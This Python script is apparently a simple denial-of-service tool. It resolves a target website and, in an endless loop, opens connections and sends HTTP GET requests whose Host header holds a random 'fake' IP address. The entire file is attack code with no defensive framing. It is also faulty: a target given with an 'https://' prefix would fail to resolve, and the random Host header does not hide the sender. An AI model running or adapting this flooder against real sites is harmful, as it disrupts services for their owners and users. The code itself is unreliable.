import socket
import random

def check_tgt(target):
    try:
        ip = socket.gethostbyname(target)
    except:
        print("Can't resolve host: Unknown host!")
        ip = None
    return ip

def fake_ip():
    while True:
        ips = [str(random.randrange(0, 256)) for _ in range(4)]
        if ips[0] == "127":
            continue
        return '.'.join(ips)

def requests(target):
    tgt_ip = check_tgt(target)
    if tgt_ip is None:
        return
    
    ssl = target.startswith('https://')
    port = 443 if ssl else 80
    
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((tgt_ip, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (tgt_ip, port))
        s.sendto(("Host: " + fake_ip() + "\r\n\r\n").encode('ascii'), (tgt_ip, port))
        s.close()